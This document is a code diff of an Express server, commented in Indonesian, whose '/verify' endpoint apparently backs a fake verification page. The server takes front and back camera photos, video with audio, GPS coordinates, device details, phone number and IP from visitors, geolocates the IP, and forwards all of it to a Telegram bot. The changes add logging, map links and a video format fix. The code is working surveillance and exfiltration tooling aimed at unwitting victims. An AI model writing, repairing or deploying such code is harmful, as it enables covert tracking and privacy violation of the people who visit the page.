@@ -21,15 +21,20 @@ app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 app.use(express.static('public'));
 
 // ============================================
-// 📍 GET LOCATION
+// 📍 GET LOCATION DARI IP
 // ============================================
 async function getLocationDetails(ip) {
     try {
+        console.log(`🔍 Getting location for IP: ${ip}`);
         const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
-        if (!cleanIp) return null;
+        if (!cleanIp) {
+            console.log('⚠️ No valid IP');
+            return null;
+        }
 
         const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,lat,lon,isp`);
         const data = await res.json();
+        console.log(`📍 IP-API response:`, data);
 
         if (data.status === 'success') {
             return {
@@ -42,7 +47,7 @@ async function getLocationDetails(ip) {
         }
         return null;
     } catch (e) {
-        console.error('Geolocation error:', e.message);
+        console.error('❌ Geolocation error:', e.message);
         return null;
     }
 }
@@ -55,7 +60,12 @@ async function sendToTelegram(data) {
         const { frontPhoto, backPhoto, video, gps, device, ip, timestamp, phone, locationData } = data;
         const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-        // KIRIM FOTO DEPAN
+        console.log(`📤 Sending to Telegram...`);
+        console.log(`📍 Location Data:`, locationData);
+        console.log(`📱 Device Data:`, device);
+        console.log(`📍 GPS Data:`, gps);
+
+        // ===== KIRIM FOTO DEPAN =====
         if (frontPhoto) {
             const buffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
 
@@ -63,19 +73,23 @@ async function sendToTelegram(data) {
             caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
             caption += `🕒 *Waktu:* ${time}\n\n`;
 
+            // DEVICE INFO
             if (device) {
                 caption += `📱 *Device:* ${device.brand || 'Tidak diketahui'} ${device.model || ''}\n`;
                 caption += `💻 *OS:* ${device.os || 'Tidak diketahui'}\n`;
                 caption += `🌐 *Browser:* ${device.browser || 'Tidak diketahui'}\n\n`;
             }
 
+            // LOKASI DARI IP
             if (locationData) {
-                caption += `📍 *Lokasi:* ${locationData.fullLocation}\n`;
+                caption += `📍 *Lokasi (IP):* ${locationData.fullLocation}\n`;
                 caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
             }
 
-            if (gps) {
+            // GPS
+            if (gps && gps.latitude && gps.longitude) {
                 caption += `📍 *GPS:* ${gps.latitude}, ${gps.longitude}\n`;
+                caption += `🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
             }
 
             caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
@@ -93,9 +107,10 @@ async function sendToTelegram(data) {
                 method: 'POST',
                 body: form
             });
+            console.log('✅ Front photo sent');
         }
 
-        // KIRIM FOTO BELAKANG
+        // ===== KIRIM FOTO BELAKANG =====
         if (backPhoto) {
             const buffer = Buffer.from(backPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
 
@@ -111,29 +126,34 @@ async function sendToTelegram(data) {
                 method: 'POST',
                 body: form
             });
+            console.log('✅ Back photo sent');
         }
 
-        // KIRIM VIDEO + AUDIO
+        // ===== KIRIM VIDEO + AUDIO (Langsung playable) =====
         if (video) {
             const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
             const videoBuffer = Buffer.from(videoBase64, 'base64');
+            console.log(`📹 Video size: ${videoBuffer.length} bytes`);
 
             const formVideo = new FormData();
             formVideo.append('chat_id', CHAT_ID);
             formVideo.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}\n🕒 ${time}`);
             formVideo.append('video', videoBuffer, {
-                filename: `video_${Date.now()}.webm`,
-                contentType: 'video/webm'
+                filename: `video_${Date.now()}.mp4`,
+                contentType: 'video/mp4'
             });
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formVideo
             });
+            const result = await response.json();
+            console.log('📹 Video send result:', result.ok ? '✅ Success' : '❌ Failed');
+            if (!result.ok) console.log('❌ Error:', result.description);
         }
 
-        // KIRIM LOKASI GPS
-        if (gps) {
+        // ===== KIRIM LOKASI GPS =====
+        if (gps && gps.latitude && gps.longitude) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -143,11 +163,12 @@ async function sendToTelegram(data) {
                     longitude: gps.longitude
                 })
             });
+            console.log('📍 GPS location sent');
         }
 
         return true;
     } catch (err) {
-        console.error('Send error:', err);
+        console.error('❌ Send error:', err);
         return false;
     }
 }
@@ -166,8 +187,13 @@ app.post('/verify', async (req, res) => {
         console.log(`📸 Front Photo: ${frontPhoto ? 'YES' : 'NO'}`);
         console.log(`📸 Back Photo: ${backPhoto ? 'YES' : 'NO'}`);
         console.log(`📹 Video: ${video ? 'YES' : 'NO'}`);
+        console.log(`📱 GPS received:`, gps);
+        console.log(`📱 Device received:`, device);
+        console.log(`🌐 IP: ${ip}`);
 
+        // GET LOCATION DARI IP
         const locationData = await getLocationDetails(ip);
+        console.log(`📍 Location from IP:`, locationData);
 
         const result = await sendToTelegram({
             frontPhoto,
